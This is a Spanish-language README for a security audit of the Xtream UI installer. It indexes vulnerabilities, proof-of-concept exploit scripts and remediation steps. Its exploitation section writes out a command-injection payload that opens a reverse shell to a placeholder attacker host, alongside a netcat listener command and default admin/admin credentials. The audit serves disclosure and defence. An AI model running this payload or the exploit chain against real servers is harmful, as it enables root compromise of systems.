# 🔐 AUDITORÍA DE SEGURIDAD - Xtream UI Installer

## Análisis Completo de Vulnerabilidades y Exploits

---

## 📑 TABLA DE CONTENIDOS

### 📊 Documentación Principal

1. **[README.md](README.md)** - Este archivo
2. **[EXECUTIVE_SUMMARY.md](EXECUTIVE_SUMMARY.md)** - Resumen ejecutivo para management
3. **[VULNERABILITIES_REPORT.md](VULNERABILITIES_REPORT.md)** - Reporte técnico detallado

### 🔴 Vulnerabilidades Identificadas

Total: **15+ vulnerabilidades**

- 🔴 Críticas: 4
- 🟠 Altas: 3  
- 🟡 Medias: 8+

#### Vulnerabilidades Principales

| ID | Nombre | Severidad | CVSS | Archivo |
|----|--------|-----------|------|---------|
| VULN-001 | Command Injection | CRÍTICA | 9.8 | install.py:82,114,122 |
| VULN-002 | SQL Injection | CRÍTICA | 9.1 | install.py:156-165 |
| VULN-003 | Weak Encryption | CRÍTICA | 8.9 | install.py:182, balancer.py:45 |
| VULN-004 | Hardcoded Credentials | CRÍTICA | 9.8 | install.py:161 |
| VULN-005 | Insecure Downloads | ALTA | 8.1 | install.py:8 |
| VULN-006 | Privilege Escalation | ALTA | 7.8 | install.py:192 |
| VULN-007 | Insecure Permissions | ALTA | 7.5 | install.py:209 |

### 🛠️ Scripts de Explotación (PoC)

Directorio: `exploits/`

| Script | Descripción | Vulnerabilidad |
|--------|-------------|----------------|
| **decrypt_config.py** | Desencripta credenciales de MySQL | VULN-003 |
| **command_injection_poc.py** | Demuestra RCE via command injection | VULN-001 |
| **sql_injection_poc.py** | Payloads y técnicas de SQLi | VULN-002 |
| **security_scanner.py** | Escáner automático de vulnerabilidades | Todas |
| **full_exploit_chain.py** | Cadena completa: RCE → Root → Persistencia | Múltiples |

---

## 🚀 INICIO RÁPIDO

### Para Desarrolladores/Defensores

**1. Leer documentación**:

```bash
# Resumen ejecutivo (5 min)
cat EXECUTIVE_SUMMARY.md

# Reporte técnico completo (20 min)
cat VULNERABILITIES_REPORT.md
```

**2. Escanear tu instalación**:

```bash
cd exploits/
python security_scanner.py TU_SERVIDOR_IP
```

**3. Verificar si tus credenciales están comprometidas**:

```bash
python decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config
```

### Para Pentesters/Red Team

**1. Reconocimiento**:

```bash
python exploits/security_scanner.py TARGET_IP
```

**2. Explotación rápida**:

```bash
# Terminal 1: Listener
nc -lvnp 4444

# Terminal 2: Exploit
python exploits/full_exploit_chain.py TARGET_IP YOUR_IP 4444
```

**3. Exploits individuales**:

```bash
# Ver payloads de command injection
python exploits/command_injection_poc.py

# Ver payloads SQL
python exploits/sql_injection_poc.py

# Desencriptar config
python exploits/decrypt_config.py /path/to/config
```

---

## 📁 ESTRUCTURA DEL PROYECTO

```
xtream-ui-install-master/
│
├── README.md                        # Este archivo - Índice general
├── EXECUTIVE_SUMMARY.md             # Resumen para management
├── VULNERABILITIES_REPORT.md        # Reporte técnico detallado
│
├── install.py                       # Instalador principal (VULNERABLE)
├── balancer.py                      # Script de balanceador (VULNERABLE)
│
├── exploits/                        # Scripts de explotación
│   ├── README.md                    # Guía de exploits
│   ├── decrypt_config.py            # Desencriptador de config
│   ├── command_injection_poc.py     # PoC de command injection
│   ├── sql_injection_poc.py         # PoC de SQL injection
│   ├── security_scanner.py          # Scanner automático
│   └── full_exploit_chain.py        # Exploit completo
│
└── files/                           # Archivos de instalación
    ├── GeoLite2.mmdb
    ├── panel_api.php
    ├── pid_monitor.php
    ├── player_api.php
    └── release_22f.zip
```

---

## 🎯 CASOS DE USO

### 🛡️ Caso 1: Auditoría de Seguridad Interna

**Objetivo**: Verificar si tu instalación actual es vulnerable

**Pasos**:

1. Ejecutar scanner: `python exploits/security_scanner.py localhost`
2. Intentar login con admin/admin
3. Verificar permisos de archivos: `ls -la /home/xtreamcodes/`
4. Revisar usuarios MySQL: `mysql -e "SELECT user,host FROM mysql.user;"`

### 🔴 Caso 2: Pentesting Autorizado

**Objetivo**: Evaluar la seguridad de un cliente

**Pasos**:

1. Obtener autorización por escrito
2. Reconocimiento: `nmap -sV -p25500 TARGET`
3. Scanner: `python exploits/security_scanner.py TARGET`
4. Intentar explotación: `python exploits/full_exploit_chain.py TARGET YOUR_IP`
5. Documentar hallazgos
6. Presentar reporte

### 🎓 Caso 3: Aprendizaje y Educación

**Objetivo**: Entender vulnerabilidades comunes

**Pasos**:

1. Leer el reporte técnico completo
2. Estudiar cada script PoC
3. Practicar en ambiente controlado (VM local)
4. Entender la remediación de cada vulnerabilidad

---

## ⚡ VULNERABILIDADES MÁS CRÍTICAS

### 1️⃣ Command Injection → RCE Root

**¿Qué es?**

- El código ejecuta comandos del sistema con input del usuario sin validación
- Se ejecuta como ROOT

**¿Cómo explotar?**

```bash
# Paso 1: Ejecutar instalador
sudo python install.py

# Paso 2: Seleccionar UPDATE
> UPDATE

# Paso 3: Inyectar payload
> http://x.com/x.zip"; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' #
```

**Impacto**: Shell root en segundos

### 2️⃣ Credenciales Hardcodeadas

**¿Qué es?**

- Usuario admin con password "admin" creado por defecto
- No hay forzado de cambio

**¿Cómo explotar?**

```bash
# Acceder a:
http://TARGET:25500/

# Login:
Usuario: admin
Password: admin
```

**Impacto**: Acceso total al panel administrativo

### 3️⃣ Weak Encryption de Credenciales MySQL

**¿Qué es?**

- Credenciales "encriptadas" con XOR y clave estática
- Fácilmente reversible

**¿Cómo explotar?**

```bash
# Leer archivo de config
python exploits/decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config

# Output:
# Host: 127.0.0.1
# Usuario: user_iptvpro
# Password: RECOVERED_PASSWORD
# Database: xtream_iptvpro
```

**Impacto**: Acceso directo a la base de datos

---

## 🔧 REMEDIACIÓN RÁPIDA

### Mitigación Inmediata (Temporal)

```bash
# 1. Cambiar credenciales de admin
mysql -u root -p xtream_iptvpro -e "UPDATE reg_users SET password='$6$NEW_HASH' WHERE username='admin';"

# 2. Restringir acceso por firewall
iptables -A INPUT -p tcp --dport 25500 -s TRUSTED_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 25500 -j DROP

# 3. Cambiar permisos
chmod 700 /home/xtreamcodes/iptv_xtream_codes/config
chmod -R 755 /home/xtreamcodes

# 4. Auditar usuarios MySQL
mysql -u root -p -e "SELECT user,host FROM mysql.user WHERE user NOT IN ('root','mysql.sys','mysql.session');"
```

### Solución Permanente

**Reescribir el código**:

- Ver ejemplos en `VULNERABILITIES_REPORT.md`
- Implementar validación de entrada
- Usar prepared statements
- Encriptación fuerte (AES-256)
- No ejecutar como root
- Implementar autenticación de 2 factores

---

## 📊 MÉTRICAS DE SEGURIDAD

### Antes de Remediación

- ❌ Vulnerabilidades críticas: 4
- ❌ Tiempo de compromiso: < 5 minutos
- ❌ Skill requerido: Básico
- ❌ Detección: Difícil
- ❌ CVSS Score: 9.8/10

### Después de Remediación (Objetivo)

- ✅ Vulnerabilidades críticas: 0
- ✅ Tiempo de compromiso: N/A
- ✅ Skill requerido: Muy alto
- ✅ Detección: Fácil (con logging)
- ✅ CVSS Score: < 3.0/10

---

## 🎓 RECURSOS EDUCATIVOS

### Para aprender más sobre estas vulnerabilidades

**OWASP Top 10**:

- A03:2021 – Injection (SQL Injection, Command Injection)
- A07:2021 – Identification and Authentication Failures
- A02:2021 – Cryptographic Failures

**Referencias**:

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE Top 25](https://cwe.mitre.org/top25/)

**Práctica**:

- TryHackMe
- HackTheBox
- PentesterLab
- PortSwigger Web Security Academy

---

## ⚖️ CONSIDERACIONES LEGALES

### ⚠️ IMPORTANTE

**Uso Autorizado**:

- ✅ Auditorías de seguridad con autorización escrita
- ✅ Pentesting en sistemas propios
- ✅ Laboratorios educativos controlados
- ✅ Bug bounty programs autorizados

**Uso NO Autorizado (ILEGAL)**:

- ❌ Atacar sistemas sin permiso
- ❌ Uso malicioso de las herramientas
- ❌ Acceso no autorizado a datos
- ❌ Daño a sistemas de terceros

**Leyes Aplicables**:

- Computer Fraud and Abuse Act (CFAA) - USA
- Código Penal - Delitos Informáticos - España/LATAM
- Computer Misuse Act - UK
- Laws locales sobre ciberseguridad

**Consecuencias del Mal Uso**:

- Cárcel
- Multas económicas significativas
- Antecedentes penales
- Demandas civiles

---

## 🤝 CONTRIBUCIONES

Este análisis de seguridad fue desarrollado para:

- ✅ Mejorar la seguridad del software
- ✅ Educar sobre vulnerabilidades comunes
- ✅ Promover desarrollo seguro
- ✅ Proteger a usuarios finales

**Si encuentras vulnerabilidades adicionales**:

1. No las explotes en ambientes de producción
2. Reporta de forma responsable
3. Da tiempo para remediar antes de divulgar públicamente
4. Contribuye a hacer el software más seguro

---

## 📞 CONTACTO Y SOPORTE

**Reporte de Vulnerabilidades**:

- Seguir proceso de divulgación responsable
- Contactar a los maintainers del proyecto
- Dar plazo de 90 días para remediar

**Preguntas sobre este análisis**:

- Revisar documentación técnica primero
- Consultar los scripts PoC
- Verificar el código fuente original

---

## 📝 CHANGELOG

**v1.0 - 2026-01-28**

- ✅ Análisis inicial completo
- ✅ 15+ vulnerabilidades identificadas
- ✅ 5 scripts PoC desarrollados
- ✅ Documentación completa creada
- ✅ Reporte técnico y ejecutivo generados

---

## 🏆 RESUMEN FINAL

Esta auditoría de seguridad ha identificado vulnerabilidades **CRÍTICAS** que requieren atención **INMEDIATA**.

**Próximos pasos recomendados**:

1. ✅ Leer `EXECUTIVE_SUMMARY.md` (Management)
2. ✅ Leer `VULNERABILITIES_REPORT.md` (Equipo técnico)
3. ✅ Probar scripts en ambiente controlado
4. ✅ Priorizar remediación por severidad
5. ✅ Implementar controles de seguridad
6. ✅ Re-auditar después de remediar

**No usar en producción hasta remediar vulnerabilidades críticas.**

---

## 📜 LICENCIA Y DISCLAIMER

**Disclaimer**: Estos scripts y documentos son para fines educativos y de seguridad únicamente.

**El autor NO se hace responsable**:

- Del mal uso de estas herramientas
- De daños causados por uso no autorizado
- De actividades ilegales realizadas con este código

**USO BAJO TU PROPIO RIESGO Y RESPONSABILIDAD**

Asegúrate de tener autorización explícita antes de ejecutar cualquier tipo de prueba de penetración.

---

**Preparado por**: Security Research Team  
**Fecha**: 28 de Enero 2026  
**Versión**: 1.0  
**Clasificación**: CONFIDENCIAL

---

© 2026 Security Assessment. Todos los derechos reservados.
Este documento es confidencial y solo debe ser usado para fines de mejora de seguridad.
